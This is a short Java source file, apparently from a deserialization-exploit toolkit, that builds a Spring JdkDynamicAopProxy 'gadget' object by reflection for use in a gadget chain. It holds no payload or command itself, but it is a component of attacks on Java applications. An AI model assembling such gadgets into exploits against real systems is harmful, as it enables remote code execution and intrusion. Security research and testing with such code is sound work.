import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.SingletonTargetSource;

public class JdkDynamicAopProxyNode{

    public static Object makeGadget(Object object) throws Exception {
        AdvisedSupport as = new AdvisedSupport();
        as.setTargetSource(new SingletonTargetSource(object));
        return Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy",AdvisedSupport.class,as);
    }


    public static Object makeGadget(Object object,AdvisedSupport as) throws Exception {
        as.setTargetSource(new SingletonTargetSource(object));
        return Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy",AdvisedSupport.class,as);
    }
}
